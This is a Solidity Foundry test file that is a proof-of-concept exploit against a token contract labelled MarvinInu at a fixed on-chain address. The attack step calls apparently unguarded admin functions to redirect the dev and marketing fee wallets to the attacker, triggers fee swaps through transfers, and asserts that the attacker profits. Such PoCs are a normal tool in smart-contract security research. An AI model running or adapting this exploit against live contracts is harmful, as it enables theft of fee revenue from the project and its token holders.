// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMarvinInu {
    function updateDevWallet(address newWallet) external;
    function updateMarketingWallet(address newMarketingWallet) external;
    function enableTrading() external;
    function tradingActive() external view returns (bool);
    function swapEnabled() external view returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function devWallet() external view returns (address);
    function marketingWallet() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x55a380d134d722006A5CE2d510562e1239D225B1;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        vm.label(TARGET, "MarvinInu");
        vm.label(attacker, "Attacker");
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        uint256 balanceBefore = attacker.balance;

        // Step 1: Redirect dev wallet to attacker (unprotected admin function)
        IMarvinInu(TARGET).updateDevWallet(attacker);

        // Step 2: Redirect marketing wallet to attacker (unprotected admin function)
        IMarvinInu(TARGET).updateMarketingWallet(attacker);

        // Step 3: Enable trading if not active
        if (!IMarvinInu(TARGET).tradingActive()) {
            IMarvinInu(TARGET).enableTrading();
        }

        // Step 4: Get token balance and transfer to trigger fees
        uint256 tokenBalance = IMarvinInu(TARGET).balanceOf(attacker);
        if (tokenBalance > 0) {
            // Transfer tokens - this may trigger swapBack if contract has accumulated fees
            IMarvinInu(TARGET).transfer(TARGET, tokenBalance / 100);
        }

        // Step 5: Check if contract has tokens to swap (from previous activity)
        uint256 contractTokenBalance = IMarvinInu(TARGET).balanceOf(TARGET);
        if (contractTokenBalance > 0 && IMarvinInu(TARGET).swapEnabled()) {
            // Trigger another transfer to potentially execute swapBack
            IMarvinInu(TARGET).transfer(attacker, contractTokenBalance / 10);
        }

        // Step 6: Verify profit
        uint256 balanceAfter = attacker.balance;
        assertGt(balanceAfter, balanceBefore, "Attacker should have profited from redirected fees");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

